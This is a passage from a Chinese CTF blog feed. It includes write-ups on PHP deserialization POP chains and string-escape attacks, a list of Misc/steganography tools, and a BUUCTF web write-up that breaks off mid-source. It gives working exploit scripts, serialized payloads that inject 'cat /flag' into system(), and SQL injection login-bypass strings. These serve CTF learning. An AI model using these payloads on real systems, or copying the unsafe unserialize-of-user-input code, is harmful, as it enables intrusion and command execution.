class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;能请你喝杯奶茶吗？&lt;br&gt;&quot;</span>;</span><br><span class="line">        @<span class="variable language_">$this</span>-&gt;like-&gt;<span class="title function_ invoke__">make_friends</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;拱火大法好&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;like-&gt;<span class="keyword">string</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">girl</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$boyname</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;我害羞羞&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;boyname-&gt;name);  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">helper</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$string</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">string</span> = <span class="variable">$string</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$val</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;僚机上线&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;僚机不懈努力&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$var</span> = <span class="variable language_">$this</span>-&gt;<span class="variable">$name</span>;</span><br><span class="line">        <span class="variable">$var</span>[<span class="variable">$name</span>]();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">love_story</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">love</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;爱情萌芽&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">array_walk</span>(<span class="variable">$this</span>, function(<span class="variable">$make</span>, <span class="variable">$colo</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;坠入爱河，给你爱的密码&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$make</span>[<span class="number">0</span>] === <span class="string">&quot;girl_and_boy&quot;</span> &amp;&amp; <span class="variable">$colo</span> === <span class="string">&quot;fall_in_love&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;iscc&quot;</span>])) &#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;iscc&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Pop链：</span><br><span class="line">boy::__destruct()--&gt;girl::__call()--&gt;helper::__isset()--&gt;boy::__toString()--&gt;helper::__get()</span><br><span class="line">找到可以利用的方法boy类的__destruct()，它调用了不可访问的方法make_friends(),触发girl类的__call()方法，isset()触发了helper类中的__isset()方法，当name是一个类对象时，触发boy类中的__tostring()方法，return $this-&gt;like-&gt;string; 访问或读取了不可私有的属性，触发helper类的__get方法 （链可以看懂，脚本不会写）</span><br></pre></td></tr></table></figure><p>脚本</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">boy</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$like</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">girl</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$boyname</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">helper</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$string</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">string</span> = <span class="keyword">array</span>(<span class="string">&quot;string&quot;</span>=&gt;[<span class="keyword">new</span> <span class="title function_ invoke__">love_story</span>(),<span class="string">&quot;love&quot;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">love_story</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fall_in_love</span> = <span class="keyword">array</span>(<span class="number">0</span>=&gt;<span class="string">&#x27;girl_and_boy&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$boy</span>= <span class="keyword">new</span> <span class="title function_ invoke__">boy</span>();</span><br><span class="line"><span class="variable">$boy1</span> = <span class="keyword">new</span> <span class="title function_ invoke__">boy</span>();</span><br><span class="line"><span class="variable">$girl</span> = <span class="keyword">new</span> <span class="title function_ invoke__">girl</span>();</span><br><span class="line"><span class="variable">$help</span>= <span class="keyword">new</span> <span class="title function_ invoke__">helper</span>();</span><br><span class="line"><span class="variable">$help1</span> = <span class="keyword">new</span> <span class="title function_ invoke__">helper</span>();</span><br><span class="line"><span class="variable">$boy</span>-&gt;like = <span class="variable">$girl</span>;</span><br><span class="line"><span class="variable">$girl</span>-&gt;boyname = <span class="variable">$help</span>;</span><br><span class="line"><span class="variable">$help</span>-&gt;name = <span class="variable">$boy1</span>;</span><br><span class="line"><span class="variable">$boy1</span>-&gt;like=<span class="variable">$help1</span>;</span><br><span class="line"><span class="variable">$n</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">array</span>(<span class="variable">$boy</span>,<span class="variable">$n</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="PHP反序列化字符串逃逸"><a href="#PHP反序列化字符串逃逸" class="headerlink" title="PHP反序列化字符串逃逸"></a>PHP反序列化字符串逃逸</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">当开发者使用先将对象序列化，然后将对象中的字符进行过滤，最后再进行反序列化。这个时候就有可能会产生PHP反序列化字符逃逸的漏洞。</span><br></pre></td></tr></table></figure><h3 id="字符串增多逃逸"><a href="#字符串增多逃逸" class="headerlink" title="字符串增多逃逸"></a>字符串增多逃逸</h3><p>参考链接：<a href="http://t.csdnimg.cn/aMcgn">php反序列化字符逃逸</a></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;bad&quot;</span>,<span class="string">&quot;good&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span> = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = <span class="variable">$key</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">waf</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">GetFlag</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>]))));</span><br></pre></td></tr></table></figure><p>这里我们需要更改<code>cmd</code>变量的值来进行命令执行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:7:&quot;GetFlag&quot;:2:&#123;s:3:&quot;key&quot;;s:3:&quot;bad&quot;;s:3:&quot;cmd&quot;;s:9:&quot;cat /flag&quot;;&#125; //没进waf</span><br><span class="line">O:7:&quot;GetFlag&quot;:2:&#123;s:3:&quot;key&quot;;s:3:&quot;good&quot;;s:3:&quot;cmd&quot;;s:9:&quot;cat /flag&quot;;&#125; //bad被换后，它的长度没有变化</span><br></pre></td></tr></table></figure><p>我们要将<code>whoami</code>变成<code>cat /flag</code>，所以我们需要逃逸的字符是</p><p><code>&quot;;s:3:&quot;cmd&quot;;s:9:&quot;cat /flag&quot;;&#125;</code>这里前面的”;是为了将bad参数位置处的双引号闭合</p><p><code>&quot;;s:3:&quot;cmd&quot;;s:9:&quot;cat /flag&quot;;&#125;</code>的长度是29，我们就需要29个bad</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>=<span class="string">&#x27;badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad&quot;;s:3:&quot;cmd&quot;;s:9:&quot;cat /flag&quot;;&#125;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span> = <span class="string">&quot;cat /flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;bad&quot;</span>,<span class="string">&quot;good&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">GetFlag</span>();</span><br><span class="line"><span class="variable">$b</span>= <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">waf</span>(<span class="variable">$b</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$c</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">object(GetFlag)#2 (2) &#123;</span><br><span class="line">  [&quot;key&quot;]=&gt;</span><br><span class="line">  string(116) &quot;goodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgood&quot;</span><br><span class="line">  [&quot;cmd&quot;]=&gt;</span><br><span class="line">  string(9) &quot;cat /flag&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>cmd的值就是我们要的值了</p><h3 id="字符串减少逃逸"><a href="#字符串减少逃逸" class="headerlink" title="字符串减少逃逸"></a>字符串减少逃逸</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVIP</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>, <span class="variable">$p</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;isVIP = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$obj</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;dabai&quot;</span>,<span class="string">&quot;hai&quot;</span>,<span class="variable">$obj</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title function_ invoke__">user</span>(<span class="string">&#x27;dabai&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>);</span><br><span class="line"><span class="variable">$obj</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;hai&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;</span><br></pre></td></tr></table></figure><p><code>username</code>的值admin被替换成hack，长度减一</p><p>php反序列化有一个特性：</p><p><strong>当序列化字符串属性的长度不够时，会往后走，直到长度与规定的长度相等为止</strong></p><p>这时候username的值就变成了<code>hai&quot;;</code>，导致无法进行反序列化</p><p>我们计算一下<strong>本可控变量末尾到下一可控变量的长度</strong>，就是我们需要吃掉的字符串</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;;s:8:&quot;password&quot;;s:6:&quot; //长度是22</span><br></pre></td></tr></table></figure><p>我们要传11个dabai</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:55:&quot;haihaihaihaihaihaihaihaihaihaihai&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;</span><br></pre></td></tr></table></figure><p>这里username值的长度是55，所以它的值就是<code>haihaihaihaihaihaihaihaihaihaihai&quot;;s:8:&quot;password&quot;;s:6:&quot;</code></p><p>我们要进行逃逸的字符串：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125; //将isVIP的值变成1</span><br></pre></td></tr></table></figure><p>我们将它赋值给password，输出</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:55:&quot;haihaihaihaihaihaihaihaihaihaihai&quot;;s:8:&quot;password&quot;;s:47:&quot;&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;</span><br></pre></td></tr></table></figure><p>取出来<code>haihaihaihaihaihaihaihaihaihaihai&quot;;s:8:&quot;password&quot;;s:47:</code>它的长度是55，但这里还多出一个<code>&quot;</code>，这里是因为password值的长度从6变成了47（字符串长度增了1）</p><p>我们再添加一个dabai，长度再减2</p><p>完整代码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVIP</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>, <span class="variable">$p</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;isVIP = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$obj</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;dabai&quot;</span>,<span class="string">&quot;hai&quot;</span>,<span class="variable">$obj</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title function_ invoke__">user</span>(<span class="string">&#x27;dabaidabaidabaidabaidabaidabaidabaidabaidabaidabaidabaidabai&#x27;</span>,<span class="string">&#x27;a&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&#x27;</span>);</span><br><span class="line"><span class="variable">$obj</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$obj</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>反序列化后输出：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">object(user)#1 (3) &#123;</span><br><span class="line">  [&quot;username&quot;]=&gt;</span><br><span class="line">  string(60) &quot;haihaihaihaihaihaihaihaihaihaihaihai&quot;;s:8:&quot;password&quot;;s:48:&quot;a&quot;</span><br><span class="line">  [&quot;password&quot;]=&gt;</span><br><span class="line">  string(6) &quot;123456&quot;</span><br><span class="line">  [&quot;isVIP&quot;]=&gt;</span><br><span class="line">  int(1)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>逃逸成功，isVIP的值变成了1</p>]]></content>
      
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Misc常用工具</title>
      <link href="/post/d17189cf.html"/>
      <url>/post/d17189cf.html</url>
      
        <content type="html"><![CDATA[<h3 id="File-命令"><a href="#File-命令" class="headerlink" title="File 命令"></a>File 命令</h3><p> 当一个文件没有后缀的时候而无法正常打开时，<br> 在Linux中可以使用： file 文件名 此命令来识别</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file filename</span><br><span class="line">strings filename //查看文件里的字符串</span><br></pre></td></tr></table></figure><h3 id="常见文件头类型"><a href="#常见文件头类型" class="headerlink" title="常见文件头类型"></a>常见文件头类型</h3><p><img src="https://nimg.ws.126.net/?url=https://crawl.ws.126.net/img/743f13caf1846ac759ad0770a83063ea.jpg&thumbnail=650x2147483647&quality=80&type=jpg" alt="img"></p><h3 id="文件分离操作"><a href="#文件分离操作" class="headerlink" title="文件分离操作"></a>文件分离操作</h3><p>1.binwalk</p><p>windows下的命令，linux下去掉python</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python binwalk filename   //查看文件的信息</span><br><span class="line">python binwalk -e filename  //分离文件</span><br></pre></td></tr></table></figure><p>2.foremost</p><p>如果binwalk无法正确分离出文件，可以使用foremost，使用kali</p><p>用法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">foremost 文件名 -o 输出目录名</span><br></pre></td></tr></table></figure><p>3.010Editor</p><p>将某块区域文件保存的方式如下:</p><p>右键选择部分</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230429164251928.png" alt="image-20230429164251928"></p><p>其他用法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctrl+shift+c  //复制左边的16进制文本</span><br><span class="line">ctrl+shift+v  //粘贴进来16进制文本 </span><br></pre></td></tr></table></figure><h3 id="图片音频工具"><a href="#图片音频工具" class="headerlink" title="图片音频工具"></a>图片音频工具</h3><p>1.Stegsolve</p><p>可以查看图片里面是否还隐藏的图片，将gif分帧进行查看，lsb隐写查看等</p><p>2.zsteg</p><p>检测LSB隐写，检测PNG和BMP图片中的隐写数据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">zsteg xxx.png</span><br></pre></td></tr></table></figure><p>3.Audacity：用于音频隐写</p><p>4.Jphide（jpg图片）</p><p>打开jphswin.exe， 使用open jpeg打开图片，点击seek,输入密码和确认密码，在弹出文件框中选择要保存的解密文件位置即可，结果保存成txt文件</p><p>5.二维码处理</p><p>CQR.exe可以扫瞄二维码的信息，如果二维码某个定位角被覆盖了，该工具有时候也可以自动识别</p><p>6.MP3Stego</p><p>处理mp3的隐写一般使用mp3Stego,但是处理时需要密码</p><p>使用decode解密（将需要解密的MP3文件复制至装有decode文件的目录下）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Decode.exe -X -P 密码 MP3文件名</span><br></pre></td></tr></table></figure><p>（-X 获取隐藏文件 -P密码）</p><p>7.steghide</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">分离：steghide extract -sf test.jpg -p 123456</span><br><span class="line">-p 密码参数，后面空格跟密码，无密码可不加参数，回车就好</span><br><span class="line">查看：steghide info</span><br></pre></td></tr></table></figure><p>8.TweakPNG</p><p>PNG图形浏览工具，当文件头正常但无法打开，可能是CRC校验错误，可以尝试通过TweakPNG打开</p><p>9.silentEye<br> silenteye是一款可以将文字或者文件隐藏到图片的解密工具</p><p>10.stegpy</p><p>支持的格式：PNG，BMP，GIF，Webp，WAV</p><p>实现隐写命令：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">stegpy 隐写内容 XXX.jpg</span><br><span class="line">stegpy 隐写内容 XXX.jpg -p   #设置密码，回车输入密码</span><br></pre></td></tr></table></figure><p>隐写完的图片会在名称前加一个下划线 <code>_XXX.jpg</code></p><p>11.画图工具gnuplot</p><p>坐标格式：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 1</span><br><span class="line">2 2</span><br><span class="line">3 3 </span><br><span class="line">. . //坐标保存txt文档</span><br></pre></td></tr></table></figure><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230528193452121.png" alt="image-20230528193452121"></p><h3 id="压缩包工具"><a href="#压缩包工具" class="headerlink" title="压缩包工具"></a>压缩包工具</h3><p>1.ZIperello：暴力破解压缩包密码</p><p>2.ARchive：更强大的暴力破解工具</p><p>3.伪加密 ZipCenOp.jar</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar ZipCenOp.jar r xx.zip</span><br></pre></td></tr></table></figure><p>就知道这些</p>]]></content>
      
      
      
        <tags>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF-web</title>
      <link href="/post/5473bd.html"/>
      <url>/post/5473bd.html</url>
      
        <content type="html"><![CDATA[<h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 万能公式</span><br><span class="line">1 and 1=1</span><br><span class="line">1&#x27; and &#x27;1&#x27;=&#x27;1</span><br><span class="line">1 or 1=1 </span><br><span class="line">1&#x27; or &#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>用万能密码登录<strong>1’ or  ‘1’&#x3D;’1</strong></p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230412190347772.png" alt="image-20230412190347772"></p><h2 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h2><p>查看网页源代码，get方式传入cat&#x3D;dog即可</p><h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><p>查看源代码，得到提示</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230412191003372.png" alt="image-20230412191003372"></p><p>对源码进行解析</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    class emmm</span><br><span class="line">    &#123;</span><br><span class="line">        public static function checkFile(&amp;$page)</span><br><span class="line">        &#123;</span><br><span class="line">            $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];</span><br><span class="line">            //条件一：page的值为空或者不是字符串，那么不通过</span><br><span class="line">            if (! isset($page) || !is_string($page)) &#123;</span><br><span class="line">                echo &quot;you can&#x27;t see it&quot;;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line">//条件二：page的值在白名单中，则通过</span><br><span class="line">            if (in_array($page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">//返回page中从第0位开始到第一个？出现的位置，之间的值赋给page</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;)//查找字符串在另一个字符串中首次出现的位置</span><br><span class="line">            );</span><br><span class="line">            //条件三：page中?之前的值在白名单中，则通过</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">//将url编码后的字符串还原成未编码的样子，然后赋值给page</span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            //返回page中从第0位开始到第一个？出现的位置，之间的值赋给page</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;)//查找字符串在另一个字符串中首次出现的位置</span><br><span class="line">            );</span><br><span class="line">            //条件四：page还原成未编码之后，?前面的值是否在白名单内，是则通过</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">            echo &quot;you can&#x27;t see it&quot;;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">//以上条件满足一个则结果包含file</span><br><span class="line">    if (! empty($_REQUEST[&#x27;file&#x27;])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[&#x27;file&#x27;])</span><br><span class="line">        &amp;&amp; 